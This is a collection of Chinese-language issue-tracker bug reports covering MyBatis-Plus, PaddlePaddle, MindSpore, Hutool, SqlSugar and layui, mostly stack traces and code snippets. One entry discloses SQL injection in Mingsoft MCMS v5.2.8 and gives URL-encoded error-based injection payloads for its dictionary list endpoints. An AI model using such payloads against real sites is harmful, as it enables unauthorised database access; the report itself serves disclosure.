""jar:file:/C:/Users/Administrator/.m2/repository/com/baomidou/mybatis-plus-generate/2.3/mybatis-plus-generate-2.3.jar!/templates/entity.java.ftl"" 19:06:01.270 [main] ERROR freemarker.runtime - Error executing FreeMarker template freemarker.core.InvalidReferenceException: The following has evaluated to null or missing: ==&gt; table.comment [in template ""templates/entity.java.ftl"" at line 19, column 6] Tip: It's the step after the last dot that caused this error, not those before it. Tip: If the failing expression is known to legally refer to something that's sometimes null or missing, either specify a default value like myOptionalVar!myDefault, or use &lt;#if myOptionalVar??&gt;when-present&lt;#else&gt;when-missing&lt;/#if&gt;. (These only cover the last step of the expression; to cover the whole expression, use parenthesis: (myOptionalVar.foo)!myDefault, (myOptionalVar.foo)?? FTL stack trace (""~"" means nesting-related): - Failed at: ${table.comment} [in template ""templates/entity.java.ftl"" at line 19, column 4] 19:06:01.272 [main] ERROR com.baomidou.mybatisplus.generator.engine.AbstractTemplateEngine - 无法创建文件，请检查配置信息！ freemarker.core.InvalidReferenceException: The following has evaluated to null or missing: ==&gt; table.comment [in template ""templates/entity.java.ftl"" at line 19, column 6] 联系方式 a244706991@qq.com   <code>: /** * &lt;p&gt; * MySQL 生成演示 * &lt;/p&gt; */ public static void main(String[] args) { AutoGenerator mpg = new AutoGenerator(); // 选择 freemarker 引擎，默认 Veloctiy mpg.setTemplateEngine(new FreemarkerTemplateEngine()); // 全局配置 GlobalConfig gc = new GlobalConfig(); gc.setOutputDir(""F:\\MP_AUTO_GENERATOR_FILE""); gc.setFileOverride(true); gc.setActiveRecord(false);// 不需要ActiveRecord特性的请改为false gc.setEnableCache(false);// XML 二级缓存 gc.setBaseResultMap(true);// XML ResultMap gc.setBaseColumnList(true);// XML columList gc.setServiceName(""%sService""); // .setKotlin(true) 是否生成 kotlin 代码 gc.setAuthor(""qxh""); // 自定义文件命名，注意 %s 会自动填充表实体属性！ // gc.setMapperName(""%sDao""); // gc.setXmlName(""%sDao""); // gc.setServiceName(""MP%sService""); // gc.setServiceImplName(""%sServiceDiy""); // gc.setControllerName(""%sAction""); mpg.setGlobalConfig(gc); // 数据源配置 DataSourceConfig dsc = new DataSourceConfig(); dsc.setDbType(DbType.ORACLE); dsc.setTypeConvert(new OracleTypeConvert() { // 自定义数据库表字段类型转换【可选】 @Override public DbColumnType processTypeConvert(String fieldType) { System.out.println(""转换类型："" + fieldType); // 注意！！processTypeConvert 存在默认类型转换，如果不是你要的效果请自定义返回、非如下直接返回。 return super.processTypeConvert(fieldType); } }); dsc.setDriverName(""oracle.jdbc.driver.OracleDriver""); dsc.setUsername(""***""); dsc.setPassword(""***""); dsc.setUrl(""jdbc:oracle:thin:@***.**.*.***:****:***""); mpg.setDataSource(dsc); // 策略配置 StrategyConfig strategy = new StrategyConfig(); strategy.setCapitalMode(true);// 全局大写命名 ORACLE 注意 //strategy.setTablePrefix(new String[] { ""tlog_"", ""tsys_"" });// 此处可以修改为您的表前缀 strategy.setNaming(NamingStrategy.underline_to_camel);// 表名生成策略 strategy.setInclude(new String[]{""BOOSJ_LIVE""}); // 需要生成的表 // strategy.setExclude(new String[]{""test""}); // 排除生成的表 // 自定义实体父类 // strategy.setSuperEntityClass(""com.baomidou.demo.TestEntity""); // 自定义实体，公共字段 // strategy.setSuperEntityColumns(new String[] { ""test_id"", ""age"" }); // 自定义 mapper 父类 // strategy.setSuperMapperClass(""com.baomidou.demo.TestMapper""); // 自定义 service 父类 // strategy.setSuperServiceClass(""com.baomidou.demo.TestService""); // 自定义 service 实现类父类 // strategy.setSuperServiceImplClass(""com.baomidou.demo.TestServiceImpl""); // 自定义 controller 父类 // strategy.setSuperControllerClass(""com.baomidou.demo.TestController""); // 【实体】是否生成字段常量（默认 false） // public static final String ID = ""test_id""; strategy.setEntityColumnConstant(true); // 【实体】是否为构建者模型（默认 false） // public User setName(String name) {this.name = name; return this;} strategy.setEntityBuilderModel(true); mpg.setStrategy(strategy); // 包配置 PackageConfig pc = new PackageConfig(); pc.setParent(null); pc.setEntity(""com.boosj.db.queryservice.oracle.entity""); pc.setService(""com.boosj.db.queryservice.service""); pc.setServiceImpl(""com.boosj.db.queryservice.service.impl""); pc.setMapper(""com.boosj.db.queryservice.oracle.mapper""); pc.setXml(""mapper.oracle""); mpg.setPackageInfo(pc); // 注入自定义配置，可以在 VM 中使用 cfg.abc 【可无】 // 自定义 xxList.jsp 生成 // 调整 xml 生成目录演示 // 关闭默认 xml 生成，调整生成 至 根目录 TemplateConfig tc = new TemplateConfig(); // 自定义模板配置，可以 copy 源码 mybatis-plus/src/main/resources/templates 下面内容修改， // 放置自己项目的 src/main/resources/templates 目录下, 默认名称一下可以不配置，也可以自定义模板名称 // TemplateConfig tc = new TemplateConfig(); // tc.setController(""...""); // tc.setEntity(""...""); // tc.setMapper(""...""); // tc.setXml(""...""); // tc.setService(""...""); // tc.setServiceImpl(""...""); // 如上任何一个模块如果设置 空 OR Null 将不生成该模块。 // mpg.setTemplate(tc); // 执行生成 mpg.execute(); // 打印注入设置【可无】 at freemarker.core.InvalidReferenceException.getInstance(InvalidReferenceException.java:134) at freemarker.core.EvalUtil.coerceModelToTextualCommon(EvalUtil.java:467) at freemarker.core.EvalUtil.coerceModelToStringOrMarkup(EvalUtil.java:389) at freemarker.core.EvalUtil.coerceModelToStringOrMarkup(EvalUtil.java:358) at freemarker.core.DollarVariable.calculateInterpolatedStringOrMarkup(DollarVariable.java:100) at freemarker.core.DollarVariable.accept(DollarVariable.java:63) at freemarker.core.Environment.visit(Environment.java:330) at freemarker.core.Environment.visit(Environment.java:336) at freemarker.core.Environment.process(Environment.java:309) at freemarker.template.Template.process(Template.java:384) at com.baomidou.mybatisplus.generator.engine.FreemarkerTemplateEngine.writer(FreemarkerTemplateEngine.java:55) at com.baomidou.mybatisplus.generator.engine.AbstractTemplateEngine.batchOutput(AbstractTemplateEngine.java:99) at com.baomidou.mybatisplus.generator.AutoGenerator.execute(AutoGenerator.java:99) at com.boosj.db.queryservice.MpGenerator.main(MpGenerator.java:162)"
请问可以把batch里每个序列数据划分为两部分，第一部分是第一条，第二部分是剩下的所有,"篇章级别，分别有title和多个句子组成的正文；想要算title与每个句子的相似度。 title和句子的表示方式相同，所以我想把title和正文内的所有句子一起输入进去做表示处理； 处理完后，需要把这个表示拆出来，也就是分为title和正文的句子集合；然后去算title和每个句子的相似度。 可以完成拆分操作吗？ 我看到有 fluid.layers.sequence_first_step 可以取第一个batch sequence 的第一个句子（也就是title），但是剩余部分可以取出来吗？ 我看到有, 但是似乎是针对一个tensor的？   <code>: fluid.layers.gather"
使用Storageable时报“Non-static method requires a target”,我在使用时，*****的下一行代码报“Non-static method requires a target”这个错误，是什么原因？应该如何解决呢？   <code>: b_employee obj = _mapper.Map&lt;b_employee&gt;(dto); var x = Db.Storageable(obj) .Saveable() .ToStorage(); await x.AsInsertable.CallEntityMethod(s =&gt; s.Create()).ExecuteCommandAsync(); // **这行报错** “Non-static method requires a target” //await x.AsInsertable.ExecuteCommandAsync(); await x.AsUpdateable.IgnoreColumns(s =&gt; new { s.emp_pass }).ExecuteCommandAsync();
Refine current codes to support multi-devices 2,"First part: Implement CUDNNDeviceContext, MKLDeviceContext hierarchy. Use decorator design pattern is not fit our needs so well, doing other things first. define LayoutType key #6827:rm unsed RegisterOp method in OpRegistry #6832:fix doc define LibraryType key #6770:Make a clear plan to support Transformer on Fluid. #6874:Fix sendrecv ut define the new OpKernelType class(four keys DataType/LayoutType/Place/LibraryType). #6769:使用reader.py读取灰度图像时报错,is_color=True是是正常的,但是is_color=False就错了 #6879:`concat_op` is extremely slow in GPU refine current kernel register mechanism refine CUDNN related operators, change them from operators to kernels https://github.com/PaddlePaddle/Paddle/pull/6660 Remove and follow new design rename GPUPlace to CUDAPlace add multikernel python test support Second part: refine Tensor implementation, add a attribute #6765:fix latex equation in fluid fc layer. https://github.com/PaddlePaddle/Paddle/pull/6955 refine Python interface and some data operators to set . share Tensor layout in most operators Third part: DataTransform function interface. DataTransformFn register mechanism #6823:NCCL call_once failed with exception kernel hint and GetExpectedKernelType #6883:Send parameter after ends one layer's backward. memory switch mechanism #6989:How to retrain a model after changing hyperparameters #6991:Refine the activation type in the GRU operator related refine memory switch mechanism in local scope #7057:Book05 recommendation systems: GPU version loss convergence comparison. #7058:Book05 recommendation systems: CPU version speed comparison and enhancement. implement some basic DataTransformFn CPU &lt;---&gt; CUDA #7050:send_recv variables layout transform, like mkldnn change batch norm to use new transform method add method to judge which inputs should be transformed refs Python interface setting kernel hint helper function of getting appropriate DeviceContext #7065:Enhence shrink_rnn_memory_op. #7066:全连接层参数复用问题 Add a mnist example that switch kernel Refine current CRF operator   <code>: CUDNNPlace MKLDNNPlace layout layout"
ServletUtil.write()返回文件时，如果文件名包含逗号，谷歌浏览器会出现下载失败,"JDK版本： openjdk_8_201 hutool版本： 5.7.18（确保最新尝试还有问题） 谷歌浏览器报错：ERR_RESPONSE_HEADERS_MULTIPLE_CONTENT_DISPOSITION 文件名：1477906619697336320-04245,3662848.jfif   <code>: ServletUtil.write(response, FileUtil.file(adminFile.getPath()));"
跑两次模型，第二次出错,"修改https://github.com/PaddlePaddle/Paddle/issues/10405的代码： if name == 'main': # CPU version main(True, False, 'cov', False) 连续两次跑GPU ，第二次报错如下：   <code>: # GPU main(True, False, 'cov', False) (0, 10, 1.1250077022868357, 0.6292794585987261) (0, 20, 0.6418896114370626, 0.7970740445859873) Traceback (most recent call last): File ""benchmark_recongnize_original.py"", line 173, in &lt;module&gt; main(True, False, 'cov', False) File ""benchmark_recongnize_original.py"", line 166, in main params_filename=params_filename) File ""benchmark_recongnize_original.py"", line 145, in train train_loop(fluid.default_main_program()) File ""benchmark_recongnize_original.py"", line 122, in train_loop fetch_list=[acc, avg_loss]) File ""/usr/local/lib/python2.7/dist-packages/paddle/fluid/executor.py"", line 340, in run self.executor.run(program.desc, scope, 0, True, True) paddle.fluid.core.EnforceNotMet: holder_ should not be null Tensor holds no memory. Call Tensor::mutable_data first. at [/paddle/paddle/fluid/framework/tensor_impl.h:66] PaddlePaddle Call Stacks: 0 0x7f79e293d486p paddle::platform::EnforceNotMet::EnforceNotMet(std::__exception_ptr::exception_ptr, char const*, int) + 486 1 0x7f79e2945ea8p paddle::framework::Tensor::check_memory_size() const + 232 2 0x7f79e2946489p float const* paddle::framework::Tensor::data&lt;float&gt;() const + 25 3 0x7f79e2ab6044p paddle::operators::BatchNormGradKernel&lt;paddle::platform::CUDADeviceContext, float&gt;::Compute(paddle::framework::ExecutionContext const&amp;) const + 3700 4 0x7f79e358b896p paddle::framework::OperatorWithKernel::RunImpl(paddle::framework::Scope const&amp;, boost::variant&lt;paddle::platform::CUDAPlace, paddle::platform::CPUPlace, paddle::platform::CUDAPinnedPlace, boost::detail::variant::void_, boost::detail::variant::void_, boost::detail::variant::void_, boost::detail::variant::void_, boost::detail::variant::void_, boost::detail::variant::void_, boost::detail::variant::void_, boost::detail::variant::void_, boost::detail::variant::void_, boost::detail::variant::void_, boost::detail::variant::void_, boost::detail::variant::void_, boost::detail::variant::void_, boost::detail::variant::void_, boost::detail::variant::void_, boost::detail::variant::void_, boost::detail::variant::void_&gt; const&amp;) const + 1318 5 0x7f79e29cbf26p paddle::framework::Executor::RunPreparedContext(paddle::framework::ExecutorPrepareContext*, paddle::framework::Scope*, bool, bool) + 358 6 0x7f79e29cc804p paddle::framework::Executor::Run(paddle::framework::ProgramDesc const&amp;, paddle::framework::Scope*, int, bool, bool) + 100 7 0x7f79e295480bp void pybind11::cpp_function::initialize&lt;pybind11::cpp_function::initialize&lt;void, paddle::framework::Executor, paddle::framework::ProgramDesc const&amp;, paddle::framework::Scope*, int, bool, bool, pybind11::name, pybind11::is_method, pybind11::sibling&gt;(void (paddle::framework::Executor::*)(paddle::framework::ProgramDesc const&amp;, paddle::framework::Scope*, int, bool, bool), pybind11::name const&amp;, pybind11::is_method const&amp;, pybind11::sibling const&amp;)::{lambda(paddle::framework::Executor*, paddle::framework::ProgramDesc const&amp;, paddle::framework::Scope*, int, bool, bool)#1}, void, paddle::framework::Executor*, paddle::framework::ProgramDesc const&amp;, paddle::framework::Scope*, int, bool, bool, pybind11::name, pybind11::is_method, pybind11::sibling&gt;(pybind11::cpp_function::initialize&lt;void, paddle::framework::Executor, paddle::framework::ProgramDesc const&amp;, paddle::framework::Scope*, int, bool, bool, pybind11::name, pybind11::is_method, pybind11::sibling&gt;(void (paddle::framework::Executor::*)(paddle::framework::ProgramDesc const&amp;, paddle::framework::Scope*, int, bool, bool), pybind11::name const&amp;, pybind11::is_method const&amp;, pybind11::sibling const&amp;)::{lambda(paddle::framework::Executor*, paddle::framework::ProgramDesc const&amp;, paddle::framework::Scope*, int, bool, bool)#1}&amp;&amp;, void (*)(paddle::framework::Executor*, paddle::framework::ProgramDesc const&amp;, paddle::framework::Scope*, int, bool, bool), pybind11::name const&amp;, pybind11::is_method const&amp;, pybind11::sibling const&amp;)::{lambda(pybind11::detail::function_call&amp;)#3}::_FUN(pybind11::detail::function_call) + 555 8 0x7f79e294e594p pybind11::cpp_function::dispatcher(_object*, _object*, _object*) + 2596 9 0x4c37edp PyEval_EvalFrameEx + 31165 10 0x4b9ab6p PyEval_EvalCodeEx + 774 11 0x4c16e7p PyEval_EvalFrameEx + 22711 12 0x4b9ab6p PyEval_EvalCodeEx + 774 13 0x4c1e6fp PyEval_EvalFrameEx + 24639 14 0x4b9ab6p PyEval_EvalCodeEx + 774 15 0x4c16e7p PyEval_EvalFrameEx + 22711 16 0x4b9ab6p PyEval_EvalCodeEx + 774 17 0x4c1e6fp PyEval_EvalFrameEx + 24639 18 0x4b9ab6p PyEval_EvalCodeEx + 774 19 0x4eb30fp 20 0x4e5422p PyRun_FileExFlags + 130 21 0x4e3cd6p PyRun_SimpleFileExFlags + 390 22 0x493ae2p Py_Main + 1554 23 0x7f7a44dac830p __libc_start_main + 240 24 0x4933e9p _start + 41"
Mingsoft MCMS v5.2.8 查询字典表列表接口存在SQL注入 【前台】,漏洞效果 listExcludeApp 接口 list 接口也是如此。   <code>: http://127.0.0.1:8080/mdiy/dict/listExcludeApp?dictType=1&amp;orderBy=1&amp;sqlWhere=%5b%7b%22%61%63%74%69%6f%6e%22%3a%22%22%2c%22%66%69%65%6c%64%22%3a%22%65%78%74%72%61%63%74%76%61%6c%75%65%28%30%78%37%65%2c%63%6f%6e%63%61%74%28%30%78%37%65%2c%28%64%61%74%61%62%61%73%65%28%29%29%29%29%22%2c%22%65%6c%22%3a%22%65%71%22%2c%22%6d%6f%64%65%6c%22%3a%22%63%6f%6e%74%65%6e%74%54%69%74%6c%65%22%2c%22%6e%61%6d%65%22%3a%22%e6%96%87%e7%ab%a0%e6%a0%87%e9%a2%98%22%2c%22%74%79%70%65%22%3a%22%69%6e%70%75%74%22%2c%22%76%61%6c%75%65%22%3a%22%61%22%7d%5d http://127.0.0.1:8080/mdiy/dict/list?dictType=1&amp;orderBy=1&amp;sqlWhere=%5b%7b%22%61%63%74%69%6f%6e%22%3a%22%22%2c%22%66%69%65%6c%64%22%3a%22%65%78%74%72%61%63%74%76%61%6c%75%65%28%30%78%37%65%2c%63%6f%6e%63%61%74%28%30%78%37%65%2c%28%64%61%74%61%62%61%73%65%28%29%29%29%29%22%2c%22%65%6c%22%3a%22%65%71%22%2c%22%6d%6f%64%65%6c%22%3a%22%63%6f%6e%74%65%6e%74%54%69%74%6c%65%22%2c%22%6e%61%6d%65%22%3a%22%e6%96%87%e7%ab%a0%e6%a0%87%e9%a2%98%22%2c%22%74%79%70%65%22%3a%22%69%6e%70%75%74%22%2c%22%76%61%6c%75%65%22%3a%22%61%22%7d%5d net.mingsoft.base.dao.IBaseDao.sqlWhere
【MindStudio提出】 GetDeviceAddress错误信息不明确,"出现无法理解的错误（可能与底层相关） [ERROR] KERNEL(65381,7fd50bcc1740,python):2022-11-10-15:02:38.918.381 [mindspore/ccsrc/kernel/kernel.h:345] GetDeviceAddress] The size of device address is zero, address index: 1, and the length of 'addr_list' is 3 [ERROR] KERNEL(65381,7fd50bcc1740,python):2022-11-10-15:02:38.918.406 [mindspore/ccsrc/kernel/kernel.h:345] GetDeviceAddress] The size of device address is zero, address index: 2, and the length of 'addr_list' is 3 / 硬件环境: GPU : -- MindSpore version :1.9.0 -- Python version : 3.7.5 -- OS platform and distribution : Ubuntu 18.04.5 LTS (/): /mode pynative /mode graph 写出脚本1 写出脚本2 脚本1报错，有关地址错误信息   <code>: import numpy as np import mindspore data = np.random.randn(2, 3).astype(np.float32) a = mindspore.Tensor(data) res = a.norm([0, 1], p=2) print(res) import numpy as np import mindspore data = np.random.randn(2, 3).astype(np.float32) a = mindspore.Tensor(data) res = a.norm(0, p=2) print(res)"
在后台管理界面，文集管理页面上有一个bug，新建文集没有反应,在后台的文集管理页面上，新建文集那里是需要加一个下拉菜单选择文集的访问权限的， 接口实际需要接收三个参数，但是这个页面的弹出框只有两个输入框，不能设置权限，导致 视图抛出异常，返回   <code>: /create_project/ create_project {status: False}
[ST][MS/pynative][NET][fasterrcnn][Ascend]train fail,"训练失败 问题commitid：8390577709c (20220623222559) ok_commit_id:3232a15b (20220513181541) / 硬件环境: /device Ascend/ : -- MindSpore version :master commit_id:ad11cdb0 -- Python version : -- OS platform and distribution : -- GCC/Compiler version : (/): /mode pynative test_ms_usability_benchmark_pynative_ascend_fasterrcnn_time_perf_loss_1p_0001 get code from models sh run_train.sh 训练成功 备注 提给陈伟峰   <code>: Traceback (most recent call last): File ""train.py"", line 252, in &lt;module&gt; train_fasterrcnn() File ""/home/jenkins/workspace/TDT_deployment/solution_test/cases/02network/00cv/fasterrcnn/pynative/test_ms_usability_benchmark_pynative_ascend_fasterrcnn_time_perf_loss_1p_0001/scripts/train/src/model_utils/moxing_adapter.py"", line 108, in wrapped_func run_func(*args, **kwargs) File ""train.py"", line 155, in train_fasterrcnn net = load_ckpt_to_network(net) File ""train.py"", line 141, in load_ckpt_to_network ms.load_param_into_net(net, param_dict) File ""/home/miniconda3/envs/ci/lib/python3.7/site-packages/mindspore/train/serialization.py"", line 703, in load_param_into_net _load_dismatch_prefix_params(net, parameter_dict, param_not_load, strict_load) File ""/home/miniconda3/envs/ci/lib/python3.7/site-packages/mindspore/train/serialization.py"", line 742, in _load_dismatch_prefix_params _update_param(param, new_param, strict_load) File ""/home/miniconda3/envs/ci/lib/python3.7/site-packages/mindspore/train/serialization.py"", line 114, in _update_param raise RuntimeError(msg) RuntimeError: For 'load_param_into_net', rcnn.reg_scores.weight in the argument 'net' should have the same shape as rcnn.reg_scores.weight in the argument 'parameter_dict'. But got its shape (1024, 320) in the argument 'net' and shape (1024, 324) in the argument 'parameter_dict'.May you need to check whether the checkpoint you loaded is correct or the batch size and so on in the 'net' and 'parameter_dict' are same."
"HttpRequest发送http请求时无法发送url参数中包括""://""的请求","JDK版本： openjdk_8_201 hutool版本： 5.8.8 使用 发送http请求时，发现无法发送url参数中包括""http://""的请求。 堆栈信息 <ol start=""3""> 说明 经过debug，发现这个框架的的109行，有段逻辑判断是何种请求协议的逻辑不怎么好，因为我这边有大量的url都包括特殊字符，任何字符都可能出现在url中： 虽然只要事先在url变量前面加上http://，而不是只提供ip地址就可以避免出现这个异常，但是上面的问题仍然困扰了我一段时间，希望你们知道这个测试案例，尽管这个方法设计就是想让非http协议的url传入时抛出异常，但是你们在判断是不是其他非http的协议可以更精准一点。   <code>: cn.hutool.http.HttpRequest // 简化版 import cn.hutool.http.HttpRequest; String url = ""127.0.0.1:5000/test?old_url=http://www.baidu.com""; HttpRequest.get(url).execute() cn.hutool.http.HttpException: 'sun.net.www.protocol.file.FileURLConnection' of URL [file:/C%3A/Users/xxx/xxx/xxx/127.0.0.1:5000/test?old_url=http:/www.baidu.com] is not a http connection, make sure URL is format for http. at cn.hutool.http.HttpConnection.openHttp(HttpConnection.java:536) at cn.hutool.http.HttpConnection.initConn(HttpConnection.java:86) at cn.hutool.http.HttpConnection.&lt;init&gt;(HttpConnection.java:73) at cn.hutool.http.HttpConnection.create(HttpConnection.java:57) at cn.hutool.http.HttpRequest.initConnection(HttpRequest.java:1171) at cn.hutool.http.HttpRequest.doExecute(HttpRequest.java:1137) at cn.hutool.http.HttpRequest.execute(HttpRequest.java:1013) at cn.hutool.http.HttpRequest.execute(HttpRequest.java:989) cn.hutool.core.net.url.UrlBuilder public static UrlBuilder ofHttp(String httpUrl, Charset charset) { Assert.notBlank(httpUrl, ""Http url must be not blank!""); final int sepIndex = httpUrl.indexOf(""://""); // 如果httpUrl中本身存在""://""，那么框架就不会再加上""http://""，导致后面发送时URL非法，抛出异常。 if (sepIndex &lt; 0) { httpUrl = ""http://"" + httpUrl.trim(); } return of(httpUrl, charset); }"
【BUG】layer弹出层最大化与恢复的问题,"版本：2.8.0_beta.2 描述：在全屏后,弹出层大小被固定,可能大家没有不会遇见这样的问题,业务需求应该也不会有这样的情况,但是确实是有这样的情况。左边是一个可收缩菜单，弹出层全屏后，如果变动菜单,必然影响弹出层的效果。   <code>: layer.full = function(index){ var layero = $('#'+ doms[0] + index), timer; ready.record(layero); if(!doms.html.attr('layer-full')){ doms.html.css('overflow','hidden').attr('layer-full', index); } clearTimeout(timer); timer = setTimeout(function(){ var isfix = layero.css('position') === 'fixed'; layer.style(index, { top: isfix ? 0 : win.scrollTop(), left: isfix ? 0 : win.scrollLeft(), width: win.width(), height: win.height() }, true); layero.find('.layui-layer-min').hide(); }, 100); };"
建议：添加 configuration-processor 依赖，解决IDEA中的错误提示,现象如下 具体的说明详见B.3章节   <code>: &lt;!-- 添加 configuration-processor 依赖，解决IDEA中的错误提示 --&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-configuration-processor&lt;/artifactId&gt; &lt;optional&gt;true&lt;/optional&gt; &lt;/dependency&gt;
fluid.layers.elementwise_mul 不支持多个维度的broadcasting,"我期望embeddings.shape是(-1， 13， 10)。 Numpy, Mxnet 和Tensorflow的element-wise 乘法都支持在多个维度上的broadcasting。例如下面的乘法操作，在维度0和2上都做了broadcasting。 Numpy相关文档：   <code>: embeddings = fluid.layers.elementwise_mul( input_reshaped, factors) # (batch_size, N, K) print('input_reshaped shape:', input_reshaped.shape) print('factors shape:', param_shape) print('embeddings shape:', embeddings.shape) input_reshaped shape: (-1L, 13L, 1L) factors shape: [1, 13, 10] embeddings shape: (-1L, 13L, 1L) In [29]: from mxnet import nd In [30]: mx.random.seed(1) In [31]: a = nd.array(range(12)).reshape(4,3,1) In [32]: b = nd.array(range(12)).reshape(1,3,4) In [35]: a.shape Out[35]: (4L, 3L, 1L) In [36]: b.shape Out[36]: (1L, 3L, 4L) In [38]: (a*b).shape Out[38]: (4L, 3L, 4L) A set of arrays is called “broadcastable” to the same shape if the above rules produce a valid result, i.e., one of the following is true: 1. The arrays all have exactly the same shape. 2. The arrays all have the same number of dimensions and the length of each dimensions is either a common length or 1. 3. The arrays that have too few dimensions can have their shapes prepended with a dimension of length 1 to satisfy property 2."
使用selectCount()时报异常,"使用如下： 异常信息如下： 我调试生成的sql如下： 请问是shardingjdbc的问题吗？应该怎么解决，谢谢了。   <code>: EntityWrapper&lt;BasicEnDictMiss&gt; wrapper = new EntityWrapper&lt;&gt;(); int count = basicEnDictMissService.selectCount(wrapper); java.lang.NoSuchMethodError: com.alibaba.druid.sql.ast.expr.SQLAggregateExpr.getOption()Lcom/alibaba/druid/sql/ast/expr/SQLAggregateExpr$Option; at com.dangdang.ddframe.rdb.sharding.parser.visitor.basic.mysql.MySQLSelectVisitor.visit(MySQLSelectVisitor.java:110) ~[sharding-jdbc-core-1.4.2.jar:na] at com.alibaba.druid.sql.visitor.SQLASTOutputVisitor.printExpr(SQLASTOutputVisitor.java:874) ~[druid-1.1.6.jar:1.1.6] at com.alibaba.druid.sql.visitor.SQLASTOutputVisitor.visit(SQLASTOutputVisitor.java:1881) ~[druid-1.1.6.jar:1.1.6] SELECT COUNT(1) FROM ( SELECT id,word,is_del AS isDel,creator_id AS creatorId,created_at AS createdAt,modifier_id AS modifierId,modified_at AS modifiedAt FROM basic_en_dict_miss ) TOTAL"
LSTM 前向调用API不合理,"在做tf算法移植到mindspore上的时候发现的问题，mindspore版本为1.2.0： tf的LSTM模块，在前向调用时，只需要输入input即可，其中的h0, c0的维度都是可以通过input，以及LSTM类初始化的参数推理得来的。但mindspore的LSTM模块，在前向调用时，除了input，还需要传入h0和c0，用来确定这两个矩阵的初始状态。这会导致一些问题： 训练mindspore框架时，如果训练样本数量不是batch size的整数倍，那么会报错，类似如下的错误： ValueError: in should be an int and must == 20, but got with type . （样本数量200， batch size 60，剩下20个样本作为最后一个batch传入，报错） 训练好的模型如果想要保存成跨平台的网络结构文件，目前mindspore提供的方法是保存成MINDIR文件，然后在其他地方导入。不过如问题1所说，如果保存的模型只接受样本以batch size为一组输入，那就无法推理单个样本。一些轻量化的问题可能会因此而无法调用推理，比如每次新来的推理请求不一定有batch size个样本。 tf没有这个限制。 不知道以上问题能不能通过在mindspore框架内通过其他办法规避或解决？ //comp/LSTM   <code>: h[1] LSTM 60 int"
表格最后一行数据的按钮下拉列表被遮挡,"正常按钮显示是这样的 但是我前端不太熟练，不知道该怎么改   <code>: { title: '&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;操作&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;', align: 'center', formatter: function(value, row, index) { var actions = []; actions.push('&lt;div class=""btn-group""&gt;\n' + ' &lt;button type=""button"" class=""btn btn-success dropdown-toggle btn-xs"" data-toggle=""dropdown""&gt;经济上传' + ' &lt;span class=""caret""&gt;&lt;/span&gt;&lt;/button&gt;\n' + ' &lt;ul class=""dropdown-menu"" role=""menu""&gt;\n' + ' &lt;li&gt;\n' + ' &lt;a onclick=""uploading(\'' + row.policyNo + '\')""&gt;上传公估报告&lt;/a&gt;\n' + ' &lt;/li&gt;\n' + ' &lt;li&gt;\n' + ' &lt;a onclick=""uploading2(\'' + row.policyNo + '\')""&gt;上传损失确认报告书&lt;/a&gt;\n' + ' &lt;/li&gt;\n' + ' &lt;/ul&gt;\n' + '&lt;/div&gt;&amp;nbsp;&amp;nbsp;'); actions.push('&lt;a class=""btn btn-info btn-xs"" href=""#"" onclick=""$.operate.detail(\'' + row.id + '\')""&gt;&lt;i class=""fa fa-search""&gt;&lt;/i&gt;详细&lt;/a&gt; '); return actions.join(''); } }"
